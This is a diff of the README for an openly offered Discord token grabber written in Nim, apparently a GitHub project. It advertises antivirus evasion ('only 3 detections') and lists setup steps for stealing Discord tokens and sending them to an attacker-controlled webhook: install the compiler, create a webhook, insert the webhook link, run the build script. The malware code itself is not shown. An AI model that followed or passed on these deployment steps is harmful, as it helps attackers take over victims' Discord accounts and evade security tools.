@@ -3,29 +3,29 @@
 **First OSS Discord Token Grabber written in Nim**
 
 ## Features
-- Small af size compared to Python loggers (318~kb)
-- Simple to get up-and-running
+- Small size compared to Python loggers (750~kb)
+- Written with pure libs (no need for DLLs)
 - No caching, everything done on-time
 - Supports a LOT of browsers and clients
-- Oh my God fully undetectable
+- Wow only 3 detections
 
 <p align=center>
-   <img src="https://user-images.githubusercontent.com/70959549/134730822-76edc775-a1c8-4c03-9658-ba17ee30d1a9.png" alt="VirusTotal Scan Result"/>
+   <img src="https://user-images.githubusercontent.com/70959549/134841402-059550fa-834f-49b2-b316-a21c3750eadb.png" alt="VirusTotal Scan Result"/>
 </p>
 
 ## How to use
-- **MUST: Install the [Nim compiler, MinGW and add to path](https://nim-lang.org/install_windows.html)**
+- **MUST: Download the [Nim compiler](https://nim-lang.org/install_windows.html), and run finish.exe**
+- Download repo as zip / git clone, and store somewhere
 - Since this needs a Discord Webhook (like all things do in life), go create one
-- Replace the webhook link and user ID with your stuffies
-- `nimble install puppy`
-- `nim c -d:release <filename>.nim` aaaand _win_
+- Replace the webhook link and user ID with your thingies
+- Run `Compile.bat`, which will sort out everything for you
 
 ## Credits and stuff
 1) **ME** ([NullCode1337](https://github.com/NullCode1337))
-2) narimiran and [his absolutely legendary PDF](https://github.com/narimiran/nim-basics)
+2) narimiran and [his legendary guide](https://github.com/narimiran/nim-basics)
 3) enthus1ast and Rika on #nim
 
 ### TODO
 - [ ] Nicer upload (using embeds)
 - [X] Testing on computers without the nim toolchain
-- [ ] Make code less weird
+- [X] Make code less weird
